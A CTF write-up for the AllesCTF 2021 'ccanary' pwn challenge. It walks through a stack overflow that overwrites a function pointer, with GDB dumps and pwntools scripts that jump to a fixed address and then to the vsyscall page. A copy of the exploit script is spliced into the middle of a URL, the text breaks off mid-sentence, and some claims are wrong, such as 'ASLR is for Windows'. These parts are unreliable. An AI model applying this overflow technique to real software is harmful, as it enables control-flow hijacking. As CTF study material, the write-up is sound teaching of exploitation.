# CCANARY ALLESCTF 2021
`ccanary` was a easy pwn challenge from the AllesCTF 2021, in this README we'll look deep into `vsyscall` and `PIE`

## Reading the Source
```c
// clang -o ccanary ccanary.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void ignore_me_init_buffering() {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
}

void canary(void) { puts("canary: *chirp* *chirp*"); }

struct data {
    char yourinput[32];
    void (*call_canary)();
    int give_flag;
};

// FIXME: this partial-overwrite mitigation sucks :/
void quotegets(char* inp) {
    *inp = '"';
    // read input
    for (; *inp != '\n';)
        *++inp = fgetc(stdin);
    // append postfix
    for (char* postfix = "\"\n- you, 2021"; *postfix; postfix++)
        *inp++ = *postfix;
    // NUL-terminate
    *inp = 0;
}

int main(void) {
    ignore_me_init_buffering();
    struct data data = {
        .yourinput = { 0 },
        .call_canary = canary,
        .give_flag = 0,
    };

    printf("quote> ");
    quotegets((char*) &data.yourinput);

    data.call_canary();
    puts("good birb!");

    puts("");
    puts((char*) &data.yourinput);

    if (data.give_flag) {
        puts("Here's the flag:");
        system("cat flag");
    }
    return 0;
}
```

We have a `poor man` implementation of `gets` function call using `fgetc` until a `\n` is found...
This allow us to overwrite pretty much anything on the stack, but i'm pretty sure security have been enabled, let's check it out.

## Program Securities
```bash
[*] '/home/spacek9/Documents/CTF/AllesCTF/ccanary/ccanary'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Okay so we have `NX` or "Linux DEP", and we have `PIE`, now what is truly `PIE` and `NX` ?

#### PIE
PIE Stands for `Position Independent Executable`, it makes sure address are randomized everytime you run the program. It works like `ASLR` but `ASLR` is for Windows, Linux uses `PIE` and `PIC`

Go read the following article by RedHat on `PIE`, it explains more detail than i can in a CTF Writeup...
https://access.redhat.com/blogs/766093/posts/1975793

#### NX
NX stands for `No Executable` and it works a bit like `DEP` or `Data Execution Prevention` on Windows.

The NX bit (no-execute) is a technology used in CPUs to segregate areas of memory for use by either storage of processor instructions (code) or for storage of data, a feature normally only found in Harvard architecture processors. However, the NX bit is being increasingly used in conventional von Neumann architecture processors for security reasons. 

The general technique, known as executable space protection, also called Write XOR Execute, is used to prevent certain types of malicious software from taking over computers by inserting their code into another program's data storage area and running their own code from within this section; one class of such attacks is known as the buffer overflow attack. 

Basically, NX stops us from executing our shellcode on the stack...

#### Trying to exploit the program
First thing first we're going to exploit the program without `PIE` enabled, for this we are going to recompile the given source code into a new binary using following command
`$ gcc ccanary.c -no-pie -o ccanary-nopie`

Now i'll just put the file in GDB and put a breakpoint right after our calls to `fgetc`
```asm
0x00000000004012aa <+92>:    call   0x4011d6 <quotegets>
0x00000000004012af <+97>:    mov    rdx,QWORD PTR [rbp-0x10]    ; We want to break here
0x00000000004012b3 <+101>:   mov    eax,0x0
$ b *main+97
```
Now let's run it with a `cyclic` pattern
`$ r <<<$(cyclic 200)`

```asm
Breakpoint 1, 0x00000000004012b3 in main ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
───────────────────────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────────────────────
 RAX  0x7fffffffdcf6 ◂— 0x0
 RBX  0x0
 RCX  0x7ffff7ecce8e (read+14) ◂— cmp    rax, -0x1000 /* 'H=' */
 RDX  0x61616a6161616961 ('aiaaajaa')
 RDI  0x0
 RSI  0x7ffff7f9ca03 (_IO_2_1_stdin_+131) ◂— 0xf9f680000000000a /* '\n' */
 R8   0x0
 R9   0x7
 R10  0x7ffff7fef440 (strcmp+4784) ◂— pxor   xmm0, xmm0
 R11  0x246
 R12  0x401080 (_start) ◂— xor    ebp, ebp
 R13  0x0
 R14  0x0
 R15  0x0
 RBP  0x7fffffffdc50 ◂— 'amaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab"\n- you, 2021'
 RSP  0x7fffffffdc20 ◂— 0x6161626161616122 ('"aaaabaa')
 RIP  0x4012b3 (main+101) ◂— mov    eax, 0
─────────────────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────────────────
 ► 0x4012b3 <main+101>    mov    eax, 0
   0x4012b8 <main+106>    call   rdx
 
   0x4012ba <main+108>    lea    rdi, [rip + 0xd71]
   0x4012c1 <main+115>    call   puts@plt                      <puts@plt>
 
   0x4012c6 <main+120>    lea    rdi, [rip + 0xd70]
   0x4012cd <main+127>    call   puts@plt                      <puts@plt>
 
   0x4012d2 <main+132>    lea    rax, [rbp - 0x30]
   0x4012d6 <main+136>    mov    rdi, rax
   0x4012d9 <main+139>    call   puts@plt                      <puts@plt>
 
   0x4012de <main+144>    mov    eax, dword ptr [rbp - 8]
   0x4012e1 <main+147>    test   eax, eax
─────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffdc20 ◂— 0x6161626161616122 ('"aaaabaa')
01:0008│     0x7fffffffdc28 ◂— 0x6161646161616361 ('acaaadaa')
02:0010│     0x7fffffffdc30 ◂— 'aeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab"\n- you, 2021'
03:0018│     0x7fffffffdc38 ◂— 'agaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab"\n- you, 2021'
04:0020│     0x7fffffffdc40 ◂— 'aiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab"\n- you, 2021'
05:0028│     0x7fffffffdc48 ◂— 'akaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab"\n- you, 2021'
06:0030│ rbp 0x7fffffffdc50 ◂— 'amaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab"\n- you, 2021'
07:0038│     0x7fffffffdc58 ◂— 'aoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab"\n- you, 2021'
───────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────
 ► f 0         0x4012b3 main+101
   f 1 0x6161706161616f61
   f 2 0x6161726161617161
   f 3 0x6161746161617361
   f 4 0x6161766161617561
   f 5 0x6161786161617761
   f 6 0x61617a6161617961
   f 7 0x6161636261616262
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

We can use `x/wx` on `$rbp-0x10` which is our `function pointer (.call_canary)`, if we overwrite the address of this call with the address where we print our flag in the main function we can win the challenge...

Let's find the offset of `$rbp-0x10` on the stack first
```
$ x/wx $rbp-0x10
0x61616961
$ cyclic -l 0x61616961
31
```

So we have a offset of 31, we can write this python script to overwrite the address at `$rbp-0x10` for (in my case) `0x00000000004012f1`
```py
from pwn import *

io = process("./canary-nopie")
io.sendline(b"a"*31 + p64(0x00000000004012f1))
io.interactive()
```
And it will print our fake flag... 
![image](https://user-images.githubusercontent.com/61102077/132341612-d09b928a-8e7c-4bcb-8ec8-221554ff7d34.png)

But note that this code will not work on the challenge itself !!! PIE is enabled and we don't know the address where we win in main for the remote program. So what we do ???

I wasn't able to solve this challenge either until the CTF ended ! After that people started sharing their writeups and i learned some new stuff on linux `vsyscalls` which are `virtual syscalls`

basically virtual system calls (vsyscall) is the first mechanism in Linux kernel to try to accelerate the execution of some certain system calls.
The idea behind vsyscall is simple. Some system call just return data to user space. If the kernel maps these system call implementation and the related-data into user space pages. Then the application can just trigger these system call like a trivial function call. There will be no context switch between user space and kernel space. We can found this vsyscall pages in kernel [documentation](https://github.com/torvalds/linux/blob/16f73eb02d7e1765ccab3d2018e0bd98eb93d973/Documentation/x86/x86_64/mm.txt).

Basically instead of leaving user mode to call a function which is wasteful, vsyscall stays in user mode and therefore make function calls a lot quicker, note that this is not the only reason vsyscalls are in place.

Also the vsyscall page is statically allocated to the same address in each process, since the location of the vsyscall page is nailed down in the kernel ABI (Application Binary Interface). This static allocation of the vsyscall compromises the benefit introduced by the memory space randomisation commonly used by Linux. An attacker, after compromising an application by exploiting a stack overflow, can invoke a system call from the vsyscall page with arbitrary parameters. And this is exactly what we're going to do...

All the attacker needs is the address of the system call, which is easily predictable as it is statically allocated (if you try to run again your command even with different applications, you'll notice that the address of the vsyscall does not change). It would be nice to remove or at least randomize the location of the vsyscall page to thwart this type of attack. Unfortunately, applications depend on the existence and exact address of that page, so nothing can be done.

This security issue has been addressed by replacing all system call instructions at fixed addresses by a special trap instruction. An application trying to call into the vsyscall page will trap into the kernel, which will then emulate the desired virtual system call in kernel space. The result is a kernel system call emulating a virtual system call which was put there to avoid the kernel system call in the first place. The result is a vsyscall which takes longer to execute but, crucially, does not break the existing ABI. In any case, the slowdown will only be seen if the application is trying to use the vsyscall page instead of the vDSO.

Please read the following posts to get more information on how syscalls actually works in a little more detail.

http://terenceli.github.io/%E6%8A%80%E6%9C%AF/2019/02/13/vsyscall-and-vdso

https://0xax.gitbooks.io/linux-insidfrom pwn import *
import sys
#io = process("./ccanary-nopie")
#io = remote("7b000000b95ffdbfb65c6157-ccanary.challenge.master.allesctf.net", 31337)

PAYLOAD = b"A" * 31 + p64(0xffffffffff600000)
sys.stdout.buffer.write(PAYLOAD)

# Send payload
#io.sendline(PAYLOAD)

# Send Payload

#iosendline(PAYLOAD)
#io.interactive()
#print(iorecvline())
es/content/SysCall/linux-syscall-3.html

### Writing the Script
The script is pretty straight forward, we just replace our RIP address with `ffffffffff600000` and we should win the challenge
```py
from pwn import *
import sys
#io = process("./ccanary-nopie")
#io = remote("7b000000b95ffdbfb65c6157-ccanary.challenge.master.allesctf.net", 31337)

PAYLOAD = b"A" * 31 + p64(0xffffffffff600000)
sys.stdout.buffer.write(PAYLOAD)

# Send payload
#io.sendline(PAYLOAD)

# Send Payload

#iosendline(PAYLOAD)
#io.interactive()
#print(iorecvline())

```

If we replace our RIP with the

## Exploiting the Program
![image](https://user-images.githubusercontent.com/61102077/132337668-a1cf6be2-d2e8-4588-aa8c-126ac8c05a20.png)
